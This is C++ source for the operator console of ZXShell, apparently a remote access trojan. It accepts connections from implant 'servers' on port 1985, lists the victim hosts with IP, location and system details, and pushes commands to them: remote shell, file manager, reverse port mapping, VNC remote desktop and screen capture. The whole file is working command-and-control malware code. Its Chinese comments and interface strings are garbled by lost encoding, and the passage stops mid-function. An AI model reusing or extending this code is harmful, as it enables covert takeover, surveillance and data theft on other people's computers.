
#include "main.h"
#include "..\zxsCommon\evlock.h"
#include "..\zxsCommon\link.h"
#include "..\zxsCommon\SocketList.h"
#include "ShellList.h"
#include "..\zxsCommon\CommandLineToArgvA.h"
#include "TranFile.cpp"
#include "ZXPortMap.cpp"
#include "FileManager.h"
#include "FileMGCMD.h"
#include "HostOwnerIOdlg.h"
#include "rportmap\client\client.h"
#include "IP2Locality.cpp"
#include "..\zxsCommon\RegEdit.h"
#include "..\zxsCommon\CRC32Class\CRC32.h"
#include "..\zxsCommon\Md5Class\Md5A.h"
#include "..\zxsCommon\funmask.h"

//�����ڹ����ļ�������
//����_ZXS_RDVIEWER����rdViewerģ���е�һЩ��������߳�ͻ
//#define _ZXS_RDVIEWER
#include "remotedesktop\rdViewer\rdViewer.h"


#include ".\remotecap Viewer\capViewerDlg.h"

//#define _useSkinMagic

#if defined _useSkinMagic

#include "SkinMagicLib.h"
#pragma comment(lib, "SkinMagicTrial.lib")

#endif

//settings saved at: Software\\zxsctrlsettings

#define CTRLVERSION (float)3.0

#define ONLINE_LVM_COLUMNCOUNT (int)7

MAIN Main;
HICON hMainIcon;
HCURSOR hSeparateCursor;
HWND hWndSocket;
SOCKET server;
bool bServicePaused;
int LisPort = 1985;
DWORD PasswdCRC32 = 0;
char PasswdMd5[33];

char CmdBuf[MAXBUFSIZE+3];
char TempBuf[MAXBUFSIZE+128];
int nextHostIdx;

int vncPort = 5500;

//��������ӹ����Ķ�������
#define action_Online	0
#define action_FileMG	1
#define action_WinVNC	3
#define action_PORTMAP	4
#define action_GETCMD	5
#define action_RDSRV	6
#define action_CAPSRV	7

enum{ CMD, DNLOAD, UPLOAD, TELHELP, FILEMANAGER, PORTMAP, 
GETCMD, RDSRV, CAPSRV};
int Action = CMD;

BOOL SoundNotify = TRUE;
LPCTSTR lpMemSound_IN;
LPCTSTR lpMemSound_OUT;
LPCTSTR lpMemSound_OPENFILE;
LPCTSTR lpMemSound_Notify;
LPCTSTR lpMemSound_Recycle;
LPCTSTR lpMemSound_Error;

C_SHELLLIST g_ShellList;
C_CMDCONNLIST g_CmdConnList;
C_SOCKETLIST g_Socket_Actions;

//�ٽ���
CEventLock evLock;
CMutexLock mxLock;
char testbuf[100];
CMyCriticalSection output_cs;

void TranMsg()
{
	MSG msg;
	while(PeekMessage(&msg, NULL, 0, 0, PM_REMOVE))//ȡ��������Ϣ������,��ֹ�������
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}

void err_display(HWND hCtrl, char *msg, DWORD errCode)
{
	LPVOID lpMsgBuf;
	char buffer[8192];
	FormatMessage( 
		FORMAT_MESSAGE_ALLOCATE_BUFFER|
		FORMAT_MESSAGE_FROM_SYSTEM,
		NULL, errCode,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf, 0, NULL);
	sprintf(buffer, "%s%s", msg?msg:"", lpMsgBuf);
	SetWindowText(hCtrl, (LPCTSTR)buffer);
	LocalFree(lpMsgBuf);
}

int MessageBox(HWND hWnd, UINT uType, char *title, const char *szMsg, ...)
{
	va_list args;
	int n;
	char szText[8192];
	va_start(args, szMsg);
	n = vsprintf(szText, szMsg, args);
	va_end(args);
	return MessageBox(hWnd, szText, title, uType);
}

bool SetSocketToBlocking(SOCKET s)
{
	int iMode = 0;
	return ioctlsocket(s, FIONBIO, (u_long FAR*) &iMode) == 0;
}

char *GetInetIP(char *OutIP)
{
	// Get host adresses
	char addr[16];
	struct hostent * pHost; 
	pHost = gethostbyname(""); 
	for( int i = 0; pHost!= NULL && pHost->h_addr_list[i]!= NULL; i++ ) 
	{
		OutIP[0]=0;
		for( int j = 0; j < pHost->h_length; j++ ) 
		{
			if( j > 0 ) strcat(OutIP,".");
			sprintf(addr,"%u", (unsigned int)((unsigned char*)pHost->h_addr_list[i])[j]);
			strcat(OutIP,addr);
		}
	}
	return OutIP;
}

SOCKET CreateUDPSocket(DWORD *LPIP, WORD *LPPort)
{
	char szIP[32];
	struct sockaddr_in 	UDPServer;
	struct sockaddr_in  in;
	memset(&in,0,sizeof(sockaddr_in));
	int structsize=sizeof(sockaddr_in);
	UDPServer.sin_family=AF_INET;
	UDPServer.sin_addr.s_addr= inet_addr(GetInetIP(szIP));
	UDPServer.sin_port=INADDR_ANY;
	SOCKET Locals = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if(Locals == SOCKET_ERROR)
	{
		//printf("UDP socket create failed.\n");
		return 0;
	}
	if(bind(Locals,(SOCKADDR*)&UDPServer, sizeof(UDPServer)) == SOCKET_ERROR)
	{
		//printf("UDP socket bind failed.\n");
		return 0;
	}
	getsockname(Locals,(struct sockaddr *)&in,&structsize);

	if(LPIP)
		*LPIP = in.sin_addr.s_addr;
	if(LPPort)
		*LPPort = in.sin_port;

	//printf("UDP Bound to %s:%d\r\n", szIP, ntohs(in.sin_port));
	return Locals;
}

int UDPSend(SOCKET s, char *buff, int nBufSize, DWORD dwIP, WORD wPort)
{
	int nBytesLeft = nBufSize;
	int idx = 0, nBytes = 0;
	int iMode = 0;
	ioctlsocket(s, FIONBIO, (u_long FAR*) &iMode);

	struct sockaddr_in 	addrin;
	memset(&addrin,0,sizeof(sockaddr_in));

	addrin.sin_family = AF_INET;
	addrin.sin_addr.s_addr = dwIP;
	addrin.sin_port = htons(wPort);

	while(nBytesLeft > 0)
	{
		nBytes = sendto(s, &buff[idx], nBytesLeft, 0, (SOCKADDR *)&addrin, sizeof(addrin));
		if(nBytes == SOCKET_ERROR) 
		{
			//printf("Failed to send buffer to socket %d.\r\n", WSAGetLastError());
			return SOCKET_ERROR;
		}
		nBytesLeft -= nBytes;
		idx += nBytes;
	}
	return idx;
}

BOOL TurnOnKeepAlive(SOCKET s, int time, int interval)
{
	//KeepAliveʵ��
	tcp_keepalive inKeepAlive = {0}; //�������
	unsigned long ulInLen = sizeof(tcp_keepalive); 

	tcp_keepalive outKeepAlive = {0}; //�������
	unsigned long ulOutLen = sizeof(tcp_keepalive); 

	unsigned long ulBytesReturn = 0; 

	BOOL bOptVal = TRUE;
	int bOptLen = sizeof(BOOL);

	//����socket��keep aliveΪ5�룬���ҷ��ʹ���Ϊ3��
	inKeepAlive.onoff = 1; 
	inKeepAlive.keepaliveinterval = interval; //����KeepAlive̽����ʱ����
	inKeepAlive.keepalivetime = time; //��ʼ�״�KeepAlive̽��ǰ��TCP�ձ�ʱ��

	if (setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, (char*)&bOptVal, bOptLen) == SOCKET_ERROR)
	{
		return FALSE;
	}

	if (WSAIoctl((unsigned int)s, SIO_KEEPALIVE_VALS,
		(LPVOID)&inKeepAlive, ulInLen,
		(LPVOID)&outKeepAlive, ulOutLen,
		&ulBytesReturn, NULL, NULL) == SOCKET_ERROR) 
	{ 
		return FALSE;
	}

	return TRUE;
}


//for GUI
int Select(SOCKET s, bool read, bool write, int timeout_sec)
{   
	int ret;
	DWORD timepassed = 0;
	fd_set FdRead, FdWrite;
	struct timeval TimeOut;


	TimeOut.tv_sec  = 0;
	TimeOut.tv_usec = timeout_sec ? 1 : 0;

	while(1)
	{
		if(read)
		{
			FD_ZERO(&FdRead);
			FD_SET(s,&FdRead);
			TranMsg();
		}
		if(write)
		{
			FD_ZERO(&FdWrite);
			FD_SET(s,&FdWrite);
		}
		ret = select(s+1,
			read?&FdRead:NULL,
			write?&FdWrite:NULL,
			NULL,
			&TimeOut);

		if(ret == 0)
		{
			if(timeout_sec > 0)
			{
				if(timepassed >= timeout_sec*100)
					break;
			}else if(timeout_sec == 0)
			{
				return 1;
			}

			timepassed += 1;
			continue;
		}else
		{
			break;
		}
	}
//	DWORD err = WSAGetLastError();
	return ret;
}


int _Select(SOCKET s, bool read, bool write, int timeout_sec)
{   
	int ret;
	DWORD timepassed = 0;
	fd_set FdRead, FdWrite;
	struct timeval TimeOut;


	TimeOut.tv_sec  = timeout_sec;
	TimeOut.tv_usec = 0;


	if(read)
	{
		FD_ZERO(&FdRead);
		FD_SET(s,&FdRead);
	}
	if(write)
	{
		FD_ZERO(&FdWrite);
		FD_SET(s,&FdWrite);
	}
	ret = select(s+1,
		read?&FdRead:NULL,
		write?&FdWrite:NULL,
		NULL,
		timeout_sec==-1?NULL:&TimeOut);


//	DWORD err = WSAGetLastError();
	return ret;
}

BOOL Recv(SOCKET Socket, char *RecvBuf, int DataLen, int TimeOut_sec, int Flag)
{
	int nRetVal, TotalBytesRecv = 0;
	int recvlen;
	while(TotalBytesRecv < DataLen)
	{
		if(Flag == 0)
		{
			if(_Select(Socket, 1, 0, TimeOut_sec) <= 0)
				return -1;
		}else
		{
			if(Select(Socket, 1, 0, TimeOut_sec) <= 0)
				return -1;
		}
		if(SetTimeOut(Socket, 1, 0, TimeOut_sec) <= 0)
			return -1;
		if(DataLen - TotalBytesRecv > 2048)
			recvlen = 2048;
		else
			recvlen = DataLen - TotalBytesRecv;
		nRetVal = recv(Socket, RecvBuf+TotalBytesRecv, recvlen, 0);
/*
		nRetVal = recv(Socket, RecvBuf+TotalBytesRecv, DataLen-TotalBytesRecv, 0);
*/
		if(nRetVal <= 0)
			return 0;
		else
			TotalBytesRecv += nRetVal;
	}
	return DataLen == TotalBytesRecv;
}

BOOL Send(SOCKET Socket, char *DataBuf, int DataLen, int TimeOut_sec, int Flag)
{
	int nBytesLeft = DataLen;
	int nBytesSent = 0;
	int nRetVal;

	while(nBytesLeft > 0)
	{
		if(Flag == 0)
		{
			if(_Select(Socket, 0, 1, TimeOut_sec) <= 0)
				return -1;
		}else
		{
			if(Select(Socket, 0, 1, TimeOut_sec) <= 0)
				return -1;
		}
		nRetVal = send(Socket, DataBuf + nBytesSent, nBytesLeft, 0);
		if(nRetVal <= 0)
			break;
		nBytesSent += nRetVal;
		nBytesLeft -= nRetVal;
	}
	return nBytesSent == DataLen;
}

BOOL _Recv(SOCKET Socket, char *RecvBuf, int DataLen, int Flag)
{
	return Recv(Socket, RecvBuf, DataLen, -1, Flag);
}

BOOL _Send(SOCKET Socket, char *DataBuf, int DataLen, int Flag)
{
	return Send(Socket, DataBuf, DataLen, -1, Flag);
}


void ForceCloseSocket(SOCKET s)
{
	linger lg = {1, 0};
	setsockopt(s, SOL_SOCKET, SO_LINGER, (const char FAR *)&lg, sizeof(lg));
	closesocket(s);
}


int __Send(SOCKET s, char *DataBuf, int DataLen, int TimeOut_sec)//��DataBuf�е�DataLen���ֽڷ���sȥ
{
    int nBytesLeft = DataLen;
    int idx = 0, nBytes = 0;

	int Result;
	fd_set FdWrtie;
	DWORD dwTimeout = (TimeOut_sec==-1)?~0:TimeOut_sec*1000;
	DWORD dwUsedTime = 0;
	struct timeval TimeOut;
	TimeOut.tv_sec  = 0;
	TimeOut.tv_usec = 1000;
	while(nBytesLeft > 0) 
	{
		FD_ZERO(&FdWrtie);
		FD_SET(s,&FdWrtie);
		Result = select(s+1,NULL,&FdWrtie,NULL,&TimeOut);
		if(Result == SOCKET_ERROR)
			return 0;
		else if(Result == 0)
		{
			dwUsedTime += 2;
			if(dwUsedTime < dwTimeout)
			{
				TranMsg();//��ǿ����������
				continue;
			}
			else
				return 0;//time out
		}

		nBytes = send(s, DataBuf+idx, nBytesLeft, 0);
        if(nBytes <= 0) 
		{
            return 0;
        }
        nBytesLeft -= nBytes;
        idx += nBytes;
	}
    return idx;
}

int __Recv(SOCKET s, char *RecvBuf, int BufSize, int TimeOut_sec)
{
	int Result;
	int nRecv=0;
	fd_set FdRead;
	DWORD dwTimeout = (TimeOut_sec==-1)?~0:TimeOut_sec*1000;
	DWORD dwUsedTime = 0;
	struct timeval TimeOut;
	TimeOut.tv_sec  = 0;
	TimeOut.tv_usec = 1000;

	while(1)
	{
		FD_ZERO(&FdRead);
		FD_SET(s,&FdRead);
		Result = select(s+1,&FdRead,NULL,NULL, &TimeOut);
		if(Result == SOCKET_ERROR)
			return SOCKET_ERROR;
		else if(Result == 0)
		{
			dwUsedTime += 2;
			if(dwUsedTime < dwTimeout)
			{
				TranMsg();//��ǿ����������
				continue;
			}
			else
				return -2;//time out
		}
		break;
	}
	Result = recv(s, RecvBuf, BufSize, 0);
	if(Result <= 0)
		return Result;
	nRecv = Result;

	return nRecv;
}

int RecvMessage(SOCKET Socket, char *RecvBuf, int DataLen, int TimeOut_sec)
{
	int nRetVal, TotalBytesRecv = 0;

	fd_set FdRead;
	DWORD dwTimeout = (TimeOut_sec==-1)?~0:TimeOut_sec*1000;
	DWORD dwUsedTime = 0;
	struct timeval TimeOut;
	TimeOut.tv_sec  = 0;
	TimeOut.tv_usec = 1000;

	while(TotalBytesRecv < DataLen)
	{
		FD_ZERO(&FdRead);
		FD_SET(Socket,&FdRead);
		nRetVal = select(Socket+1,&FdRead,NULL,NULL, &TimeOut);
		if(nRetVal == SOCKET_ERROR)
			return 0;
		else if(nRetVal == 0)
		{
			dwUsedTime += 2;
			if(dwUsedTime < dwTimeout)
			{
				TranMsg();//��ǿ����������
				continue;
			}
			else
				return 0;//time out
		}

		nRetVal = recv(Socket, RecvBuf+TotalBytesRecv, DataLen-TotalBytesRecv, 0);
		if(nRetVal <= 0)
			return 0;
		else
			TotalBytesRecv += nRetVal;
	}
	return DataLen == TotalBytesRecv;
}

int SendMessage(SOCKET Socket, const char *fmt, ...)
{
	if(Socket == ~0)
		return 0;
	va_list args;
	int n;
	char TempBuf[8192];
	va_start(args, fmt);
	n = vsprintf(TempBuf, fmt, args);
	va_end(args);

	if(Socket == 0)
	{
		printf("%s", TempBuf);
		return 0;
	}
	SetSocketToBlocking(Socket);
	return send(Socket, TempBuf, n, 0);
}

char *GetPeerIPStr(SOCKET s)
{
	struct sockaddr_in client;
	int structsize=sizeof(struct sockaddr);

	if(getpeername(s, (struct sockaddr *)&client, &structsize)<0)
		return "Unknown";
	else
		return inet_ntoa(client.sin_addr);
}

BOOL GetDirPath(HWND hWnd, BOOL FileOrDir, char *RetPath)
{
	BROWSEINFO bi;
	ZeroMemory(&bi, sizeof(BROWSEINFO));
	bi.hwndOwner = hWnd;
	bi.lpszTitle = FileOrDir ? "ѡ��Ŀ���ļ�." : "ѡ��Ŀ��Ŀ¼.";
	bi.ulFlags = BIF_DONTGOBELOWDOMAIN;
	bi.ulFlags |= FileOrDir ? BIF_BROWSEINCLUDEFILES : (BIF_RETURNONLYFSDIRS|BIF_NEWDIALOGSTYLE);
	ITEMIDLIST * pidl = SHBrowseForFolder(&bi);
	if (pidl)
		return SHGetPathFromIDList(pidl, RetPath);
	else
		return 0;
}

BOOL StartServer()
{
	int retval;
	BOOL nLevel = 1;
	SOCKADDR_IN serveraddr;

	server = socket(AF_INET, SOCK_STREAM, 0);
	if(server == INVALID_SOCKET){
		goto error;
	}

	retval = WSAAsyncSelect(server, hWndSocket, WM_SOCKET, FD_ACCEPT|FD_CLOSE);
	if(retval == SOCKET_ERROR) {
		goto error;
	}
	ZeroMemory(&serveraddr, sizeof(serveraddr));
	serveraddr.sin_family = AF_INET;
	serveraddr.sin_port = htons(LisPort);
	serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);

/*
	if (setsockopt(server, SOL_SOCKET, SO_EXCLUSIVEADDRUSE,
        (const char FAR *)&nLevel, sizeof(nLevel)) != 0) {
        return 0;
    }
*/

	retval = bind(server, (SOCKADDR *)&serveraddr, sizeof(serveraddr));
	if(retval == SOCKET_ERROR){
		goto error;
	}

	retval = listen(server, SOMAXCONN);
	if(retval == SOCKET_ERROR){
		goto error;
	}
	return 1;
error:
	closesocket(server);
	server = 0;
	return 0;
}

void CloseServer()
{
	g_ShellList.CloseAllSocket();
	closesocket(server);
	server = 0;
}

void InitAudioFile()
{
	HMODULE hmod;
	HRSRC hSndResource;
	HGLOBAL hGlobalMem;
	//������Դ����Ϣ
	hmod = Main.hInst;
	hSndResource = FindResource(hmod,MAKEINTRESOURCE(IDR_WAVE_IN),TEXT("WAVE"));
	//װ����Դ���ݲ�����
	hGlobalMem = LoadResource(hmod,hSndResource);
	lpMemSound_IN = (LPCSTR)LockResource(hGlobalMem);

	hSndResource = FindResource(hmod,MAKEINTRESOURCE(IDR_WAVE_OUT),TEXT("WAVE"));
	hGlobalMem = LoadResource(hmod,hSndResource);
	lpMemSound_OUT = (LPCSTR)LockResource(hGlobalMem);

	hSndResource = FindResource(hmod,MAKEINTRESOURCE(IDR_WAVE_OPENFILE),TEXT("WAVE"));
	hGlobalMem = LoadResource(hmod,hSndResource);
	lpMemSound_OPENFILE = (LPCSTR)LockResource(hGlobalMem);

	hSndResource = FindResource(hmod,MAKEINTRESOURCE(IDR_WAVE_Error),TEXT("WAVE"));
	hGlobalMem = LoadResource(hmod,hSndResource);
	lpMemSound_Error = (LPCSTR)LockResource(hGlobalMem);

	hSndResource = FindResource(hmod,MAKEINTRESOURCE(IDR_WAVE_Notify),TEXT("WAVE"));
	hGlobalMem = LoadResource(hmod,hSndResource);
	lpMemSound_Notify = (LPCSTR)LockResource(hGlobalMem);

	hSndResource = FindResource(hmod,MAKEINTRESOURCE(IDR_WAVE_Recycle),TEXT("WAVE"));
	hGlobalMem = LoadResource(hmod,hSndResource);
	lpMemSound_Recycle = (LPCSTR)LockResource(hGlobalMem);

}


int Startup()
{
	INITCOMMONCONTROLSEX iccs;
	iccs.dwSize = sizeof(INITCOMMONCONTROLSEX);
	iccs.dwICC = ICC_ANIMATE_CLASS | ICC_BAR_CLASSES | ICC_COOL_CLASSES | ICC_DATE_CLASSES | ICC_HOTKEY_CLASS | ICC_INTERNET_CLASSES | ICC_LISTVIEW_CLASSES | ICC_NATIVEFNTCTL_CLASS| ICC_PAGESCROLLER_CLASS | ICC_PROGRESS_CLASS | ICC_TAB_CLASSES | ICC_TREEVIEW_CLASSES | ICC_UPDOWN_CLASS | ICC_USEREX_CLASSES | ICC_WIN95_CLASSES;

	if (!InitCommonControlsEx(&iccs))
		return false;

	WSAData wsa;
	if (WSAStartup(MAKEWORD(2, 2), &wsa))
		return false;

	hMainIcon = LoadIcon(Main.hInst, MAKEINTRESOURCE(IDI_ICON1));
	hSeparateCursor = LoadCursor(NULL, IDC_SIZENS);

	Main.hWnd = CreateDialog(Main.hInst, MAKEINTRESOURCE(IDD_MAIN_DLG), 0, MainDlgProc);

	if(!Main.hWnd)
		return false;

	TaskBar(NIM_ADD, hMainIcon, NULL);

	//��ʼ����������
	if(!output_cs.Init())
		return false;
	if(!evLock.Init())
		return false;
	if(!mxLock.Init())
		return false;

	//����SOCKET�����Ĵ���
	WNDCLASS wndclass;
	wndclass.cbClsExtra = 0;
	wndclass.cbWndExtra = 0;
	wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	wndclass.hCursor = LoadCursor(NULL, IDC_ARROW);
	wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wndclass.hInstance = NULL;
	wndclass.lpfnWndProc = (WNDPROC)SocketMsgProc;
	wndclass.lpszClassName = "ZXSHELL_CTRL";
	wndclass.lpszMenuName = NULL;
	wndclass.style = CS_HREDRAW | CS_VREDRAW;
	if(!RegisterClass(&wndclass)) return false;

	hWndSocket = CreateWindow("ZXSHELL_CTRL", "ZXController",
		WS_OVERLAPPEDWINDOW, 0, 0, 0, 0,
		NULL, (HMENU)NULL, NULL, NULL);
	if(hWndSocket == NULL) return false;



	InitMainPanel();
	InitAudioFile();

	if(ReadReg(HKEY_CURRENT_USER, "Software\\zxsctrlsettings", "LisPort", &LisPort, sizeof(LisPort)))
	{
		LisPort ^= 0x1985;
	}
	ReadReg(HKEY_CURRENT_USER, "Software\\zxsctrlsettings", "SoundNotify", &SoundNotify, sizeof(SoundNotify));
	ReadReg(HKEY_CURRENT_USER, "Software\\zxsctrlsettings", "passwd", PasswdMd5, sizeof(PasswdMd5));

	CRC32 crc;

	PasswdCRC32 = crc.GetCrc32((BYTE*)PasswdMd5, strlen(PasswdMd5)+1);

	EnableWindow(GetDlgItem(Main.hWnd, IDC_STOP), FALSE);
	EnableWindow(GetDlgItem(Main.hWnd, IDC_PAUSE), FALSE);
	PostMessage(Main.hWnd, WM_SIZE, 0, 0);

	SendMessage(GetDlgItem(Main.hWnd, IDC_RESULT), EM_SETLIMITTEXT, 0, 0);
	SendMessage(GetDlgItem(Main.hWnd, IDC_CMD), CB_INSERTSTRING, 0, LPARAM("help"));
	SetFocus(GetDlgItem(Main.hWnd, IDC_CMD));

#if defined _useSkinMagic
	//SkinMagic
	InitSkinMagicLib( Main.hInst, "Demo" , 
					  NULL,
					  NULL );
	LoadSkinFile("skin\\x-plus.smf"); 
	SetDialogSkin( "Dialog" );

	SetWindowSkin( Main.hWnd , "MainFrame" );
#endif

	return true;
}

void Cleanup()
{
	WSACleanup();
}

void InitMainPanel()
{
	//ONLINE_LVM_COLUMNCOUNT = 7
	LVCOLUMN lv;
	char *szText[]={"������Ϣ", "IP��ַ", "����λ��", "����˰汾", "����ʱ��", "ϵͳ��Ϣ", "����"};

	HWND hDlg = Main.hWnd;

	lv.mask = LVCF_TEXT|LVCF_WIDTH|LVCF_SUBITEM;
	lv.fmt = LVCFMT_RIGHT;

	lv.iSubItem = 77771;
	lv.cx = 140;
	lv.pszText = szText[0];
	SendDlgItemMessage(hDlg,IDC_ONLINE,LVM_INSERTCOLUMN,(WPARAM)0,(LPARAM)&lv);

	lv.iSubItem = 77772;
	lv.cx = 110;
	lv.pszText = szText[1];
	SendDlgItemMessage(hDlg,IDC_ONLINE,LVM_INSERTCOLUMN,(WPARAM)1,(LPARAM)&lv);

	lv.iSubItem = 77773;
	lv.cx = 110;
	lv.pszText = szText[2];
	SendDlgItemMessage(hDlg,IDC_ONLINE,LVM_INSERTCOLUMN,(WPARAM)2,(LPARAM)&lv);

	lv.iSubItem = 77774;
	lv.cx = 75;
	lv.pszText = szText[3];
	SendDlgItemMessage(hDlg,IDC_ONLINE,LVM_INSERTCOLUMN,(WPARAM)3,(LPARAM)&lv);

	lv.iSubItem = 77775;
	lv.cx = 128;
	lv.pszText = szText[4];
	SendDlgItemMessage(hDlg,IDC_ONLINE,LVM_INSERTCOLUMN,(WPARAM)4,(LPARAM)&lv);

	lv.iSubItem = 77776;
	lv.cx = 350;
	lv.pszText = szText[5];
	SendDlgItemMessage(hDlg,IDC_ONLINE,LVM_INSERTCOLUMN,(WPARAM)5,(LPARAM)&lv);

	lv.iSubItem = 77777;
	lv.cx = 200;
	lv.pszText = szText[6];
	SendDlgItemMessage(hDlg,IDC_ONLINE,LVM_INSERTCOLUMN,(WPARAM)6,(LPARAM)&lv);

	SendDlgItemMessage(hDlg,IDC_ONLINE, LVM_SETEXTENDEDLISTVIEWSTYLE, 0, LVS_EX_GRIDLINES|LVS_EX_FULLROWSELECT | LVS_EX_HEADERDRAGDROP);

}

BOOL PreTranslateMessage(MSG *pMsg)     
{   
	if(GetDlgItem(Main.hWnd,IDC_CMD) == GetParent(GetFocus()))//�жϽ����ڲ��ڿ���   
	{
		if(pMsg->message==WM_KEYDOWN)   
		{
			if(pMsg->wParam == VK_RETURN)   
			{
				CmdBuf[0] = '\0';
				GetDlgItemText(Main.hWnd, IDC_CMD, CmdBuf, MAXBUFSIZE);

				if(SendCmdLine(CmdBuf))
					SetDlgItemText(Main.hWnd, IDC_CMD, "");
				return TRUE;
			}   
		}
	}

	return FALSE;
}   

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
	Main.hInst = hInst;

	if(!Startup())
		return 0;

	ShowWindow(Main.hWnd, nShow);

	MSG msg;
	while(GetMessage(&msg, NULL, 0, 0))
	{
		if(PreTranslateMessage(&msg))
			continue;

		if(!IsDialogMessage(Main.hWnd, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	output_cs.Destroy();
	evLock.Destroy();
	mxLock.Destroy();
	//Cleanup();
	return msg.wParam;
}

BOOL OutPutResult(char *szBuf, HWND hWnd)
{
	//CMyCriticalSection lock(output_cs);

	SETTEXTEX stex;
	stex.flags = ST_KEEPUNDO;
	stex.codepage = CP_ACP;

	HWND hResult = GetDlgItem(hWnd, IDC_RESULT);

	SendMessage(hResult, EM_SETSEL, 0, -1);//select all the text
	SendMessage(hResult, EM_SETSEL, (WPARAM)-1, (LPARAM)0);//deselect any selection
	//now the cursor position has been changed to the end.
	SendMessage(hResult, EM_REPLACESEL, TRUE, (LPARAM)szBuf);

	if(GetForegroundWindow() != hWnd)
		FlashWindow(hWnd, TRUE);

	return TRUE;
}

int SendCmdToServer(SOCKET Socket, char *Cmd, int len)
{
	_CZXServer *zxserver;

	zxserver = g_ShellList.IsSocketInList(Socket);

	if(zxserver == NULL)
		return -1;

	//�����ǽ�����Ƶ�zxserver�����еĻ��������Ժ���FD_WRITE�¼�����
	if(! zxserver->Send(Cmd, len))
		return 0;

	PostMessage(hWndSocket, WM_SOCKET, Socket, FD_WRITE);
	return 1;
}

BOOL SendCmdLine(char *Cmd)
{
	SOCKET Socket;
	int ret, cmdlen = 0;

	HWND hDlg = GetDlgItem(Main.hWnd, IDC_ONLINE);
	HWND hResult = GetDlgItem(Main.hWnd, IDC_RESULT);
	HWND hCmd = GetDlgItem(Main.hWnd, IDC_CMD);

	ARGWTOARGVA arg(Cmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();


	if((ret = SendMessage(hDlg, LVM_GETSELECTEDCOUNT, 0, 0)) == 0)
	{
		MessageBox(hDlg, "����ѡ��һ��������? (���Զ�ѡ)", "����", MB_ICONERROR);
		return FALSE;
	}

	if(*Cmd)
	{
		//���µ�����ӵ��б���
		if((ret = SendMessage(hCmd, CB_FINDSTRINGEXACT, 0, (LPARAM)Cmd)) != CB_ERR)
		{
			//�Դ�������м�ɾ����
			SendMessage(hCmd, CB_DELETESTRING, ret, 0);
		}else
		{
			if((ret = SendMessage(hCmd, CB_GETCOUNT, 0, 0)) >= 10)
			{
				SendMessage(hCmd, CB_DELETESTRING, ret-1, 0);
			}
		}
	}
	if(*Cmd)
		SendMessage(hCmd, CB_INSERTSTRING, 0, LPARAM(Cmd));

	strcat(Cmd, "\r\n");

	cmdlen = strlen(Cmd);
	if(cmdlen > 4195)
	{
		MessageBox(hDlg, "����ȱ����� 4196�ֽ�����?", "����", MB_ICONERROR);
		return FALSE;
	}

	OutPutResult(Cmd);

	nextHostIdx = -1;
	while(GetSelectedItems(&Socket))
	{
		if(!g_Socket_Actions.IsSocketInList(Socket))
		{
			ret = SendCmdToServer(Socket, Cmd, cmdlen);
			if(ret < 0)
			{
				PostMessage(hWndSocket, WM_SOCKET, Socket, FD_CLOSE);
			}else if(ret == 0)
			{
				OutPutResult("����û����, ��Ϊ����������һ������ڷ�����...\r\n");
			}
		}
		else
			OutPutResult("����û����, ��Ϊ�����������һ������δ����.\r\n");
	}

	return TRUE;
}

BOOL SendCmdCode(int code)
{
	int ret, cmdlen = 0;
	char Cmd[MAXBUFSIZE];
	SOCKET Socket;

	HWND hDlg = GetDlgItem(Main.hWnd, IDC_ONLINE);
	HWND hResult = GetDlgItem(Main.hWnd, IDC_RESULT);
	HWND hCmd = GetDlgItem(Main.hWnd, IDC_CMD);

	if(SendMessage(hDlg, LVM_GETSELECTEDCOUNT, 0, 0) == 0)
	{
		MessageBox(hDlg, "����ѡ��һ��������? (���Զ�ѡ)", "����", MB_ICONERROR);
		return FALSE;
	}

	nextHostIdx = -1;
	while(GetSelectedItems(&Socket))
	{
		if(code == TELHELP)
		{
			OutPutResult("����ִ������: Զ������......\r\n");
			cmdlen = sprintf(Cmd, "winvnc\r\n");
		}
		else if(code == FILEMANAGER)
		{
			cmdlen = sprintf(Cmd, "FileMG\r\n");
			OutPutResult("����ִ������: �ļ�����......\r\n");
			Action = FILEMANAGER;

		}else if(code == PORTMAP)
		{
			cmdlen = sprintf(Cmd, "rPortMap\r\n");
			OutPutResult("����ִ������: �˿�ӳ��......\r\n");
		}else if(code == GETCMD)
		{
			cmdlen = sprintf(Cmd, "getcmd\r\n");
			OutPutResult("����ִ������: ������ʾ��......\r\n");
		}else if(code == CAPSRV)
		{
			cmdlen = sprintf(Cmd, "capsrv\r\n");
			OutPutResult("����ִ������: ��Ƶ����......\r\n");
		}else
			continue;

		if(!g_Socket_Actions.IsSocketInList(Socket))
		{
			ret = SendCmdToServer(Socket, Cmd, cmdlen);
			if(ret < 0)
			{
				PostMessage(hWndSocket, WM_SOCKET, Socket, FD_CLOSE);
			}else if(ret == 0)
			{
				OutPutResult("����û����, ��Ϊ����������һ������ڷ�����...\r\n");
			}
		}
		else
			OutPutResult("����û����, ��Ϊ�����������һ������δ����.\r\n");
	}

	return TRUE;
}

void AbortConn()
{
	SOCKET Socket;

	HWND hDlg = GetDlgItem(Main.hWnd, IDC_ONLINE);

	if(SendMessage(hDlg, LVM_GETSELECTEDCOUNT, 0, 0) == 0)
	{
		return;
	}

	nextHostIdx = -1;
	while(GetSelectedItems(&Socket))
	{
		//ForceCloseSocket(Socket);
		PostMessage(hWndSocket, WM_SOCKET, Socket, FD_CLOSE);
	}
}

//����ѡ����������ţ�������1��0��ʾû��ѡ�е�
BOOL GetSelectedItems(SOCKET *Socket)
{
	int idx;
	LVITEM lv;
	HWND hDlg = GetDlgItem(Main.hWnd, IDC_ONLINE);
	idx = SendMessage(hDlg, LVM_GETNEXTITEM, nextHostIdx, LVNI_SELECTED);
	if(idx == -1)
		return FALSE;
	nextHostIdx = idx;
	memset(&lv, 0, sizeof(LVITEM));
	lv.mask = LVIF_PARAM;
	lv.iSubItem		= 0;
	lv.iItem = idx;

	if(SendMessage(hDlg, LVM_GETITEM, 0, LPARAM(&lv)) <= 0)
		return FALSE;

	if(Socket)
		*Socket = lv.lParam;
	return idx+1;
}

int GetHostItemIdxBySocket(SOCKET s)
{
